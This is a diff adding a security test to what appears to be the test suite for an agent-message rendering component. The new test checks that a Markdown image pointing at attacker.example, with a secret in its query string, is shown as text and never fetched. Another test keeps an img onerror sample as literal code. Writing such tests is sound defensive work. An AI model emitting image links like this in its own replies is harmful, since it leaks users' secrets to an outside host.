@@ -25,6 +25,16 @@ describe('Agent message security', () => {
     wrapper.destroy()
   })
 
+  it('should replace remote Markdown images with text instead of fetching them', () => {
+    const content = '![x](https://attacker.example/c?d=SECRET)'
+    const wrapper = render(content)
+
+    expect(wrapper.find('img').exists()).to.equal(false)
+    expect(wrapper.text()).to.contain('https://attacker.example/c?d=SECRET')
+    expect(wrapper.html()).to.not.contain('<img')
+    wrapper.destroy()
+  })
+
   it('should preserve Markdown formatting and literal code samples', () => {
     const content = '# Result\n\n**Connected**\n\n```html\n<img onerror="example()">\n```'
     const wrapper = render(content)
